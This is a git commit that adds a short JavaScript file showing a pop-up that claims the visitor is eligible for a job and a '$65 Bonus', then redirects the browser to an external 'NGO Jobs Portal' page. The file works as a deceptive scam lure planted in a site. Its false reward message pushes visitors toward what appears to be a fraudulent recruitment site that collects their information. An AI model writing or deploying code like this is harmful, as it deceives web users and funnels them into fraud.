911a07305eebb93fa4bd9a0d4c20d60efe1d6cd4
mas-gift <harisuhamza310@gmail.com>
2026-01-09 12:11:14 +0100

    Create ngo-active.js

---
+++ ngo-active.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('Recruitment Portal: Congratulations, you are eligible to Apply & get $65 Bonus, Kindly press OK to submit your information now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://job-recruiter.org/NGO-Jobs-Portal.html';
+}
